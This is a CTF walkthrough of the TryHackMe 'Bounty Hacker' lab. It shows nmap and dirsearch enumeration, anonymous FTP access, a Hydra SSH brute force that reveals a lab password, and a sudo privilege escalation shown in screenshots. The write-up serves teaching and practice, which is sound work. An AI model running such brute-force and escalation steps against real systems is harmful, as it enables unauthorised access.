# Bounty Hacker
## Machine Info
- A basic TryHackMe CTF challange that contains ftp, enumeration, brute force, privilege escalation.

## Used Tools
* Nmap
* Dirsearch
* Hydra


####  *Enumeration* 

Initially, start with nmap scan:
> nmap -sV -sC -oN ./bounty_nmap MACHINE_IP

```white
Nmap 7.92 scan initiated Sun Feb 27 14:10:01 2022 as: nmap -sV -sC -oN ./bounty_nmap.txt 10.10.176.234
Nmap scan report for 10.10.176.234
Host is up (0.075s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.37.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We have a ftp service running on port 21 and http service on port 80. Important point to see is that we can login as Anonymous to ftp. 

Login to ftp:
>ftp MACHINE_IP

![](https://i.imgur.com/YuV12d9.png)



Here, we see two text files that may contain useful information we can play with. Copy them to your local computer by ```get task.txt```  and ```get locks.txt```

Locks.txt looks like it has important things, we may use them as password. Also task.txt doesn't give much info but we may have a username named 'lin':

![](https://i.imgur.com/2YZWcrY.png)


Let's head to http://MACHINE_IP to see what much more info we may get. Meanwhile using dirsearch, try to enumerate subdirectories:

>dirsearch -l /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http:MACHINE_IP

```bash
  _|. _ _  _  _  _ _|_    v0.4.2                                                            
 (_||| _) (/_(_|| (_| )                                                                     
                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /usr/lib/python3/dist-packages/dirsearch/bounty_dirsearch.txt

Error Log: /root/.dirsearch/logs/errors-22-02-27_14-22-24.log

Target: http://10.10.176.234/

[14:22:24] Starting: 
[14:22:27] 403 -  278B  - /.htaccess.sample                                
[14:22:27] 403 -  278B  - /.htaccess.save
[14:22:27] 403 -  278B  - /.htaccessBAK                                    
[14:22:27] 403 -  278B  - /.htaccess_sc
[14:22:27] 403 -  278B  - /.htaccess_orig                                  
[14:22:27] 403 -  278B  - /.htm                                            
[14:22:27] 403 -  278B  - /.htaccessOLD2
[14:22:27] 403 -  278B  - /.htaccess.bak1
[14:22:27] 403 -  278B  - /.htaccessOLD
[14:22:27] 403 -  278B  - /.ht_wsr.txt
[14:22:27] 403 -  278B  - /.htaccess_extra
[14:22:27] 403 -  278B  - /.htaccess.orig
[14:22:27] 403 -  278B  - /.html
[14:22:27] 403 -  278B  - /.htpasswd_test
[14:22:27] 403 -  278B  - /.htpasswds                                      
[14:22:27] 403 -  278B  - /.httr-oauth                                     
[14:23:02] 301 -  315B  - /images  ->  http://10.10.176.234/images/         
[14:23:02] 200 -  938B  - /images/
[14:23:03] 200 -  969B  - /index.html                                       
[14:23:20] 403 -  278B  - /server-status                                    
[14:23:20] 403 -  278B  - /server-status/

Task Completed
```


In website, we see a conversation between Spike,Jet, Ed and Faye. Also they mention other names Edward and Ein.

![](https://i.imgur.com/p2XGHaD.png)

In subdirectory /images, we just have the image of the crew as we see on directly on site so it look like it won't be useful for now.



#### *Obtaining Foothold*

Now we have 7 potential usernames Lin, Spike, Jet, Ed, Faye, Edward, Ein. Since we thought that locks.txt may be a password list that can be handy, let's try to bruteforce by creating a text file named 'potential_usernames.txt" where the usernames listed in.
>hydra -L potential_usernames.txt -P locks.txt ssh://MACHINE_IP

```white
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-27 14:27:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 182 login tries (l:7/p:26), ~12 tries per task
[DATA] attacking ssh://10.10.176.234:22/
[22][ssh] host: 10.10.176.234   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-27 14:28:12
```


Aand here it is! We found lin's password! Let's login via ssh:

![](https://i.imgur.com/R9lXPCE.png)



We should find the flags now. By checking Desktop with a quick 'ls -la' we found the user.txt flag!

![](https://i.imgur.com/zuNPyYR.png)



#### *Privilege Escalation* 

In order to find root.txt (we may easily assume that it's in /root), we should escalate our privileges. My first attempt was a quick 'sudo -l' to find any commands we may run as root and it worked.

![](https://i.imgur.com/etsjXMO.png)


Let's head to GTFOBins and see how to get root shell.

![](https://i.imgur.com/GRFOSPT.png)

![](https://i.imgur.com/oDgdjzU.png)

As it seen, we easily escalated to the root shell, and got the flag!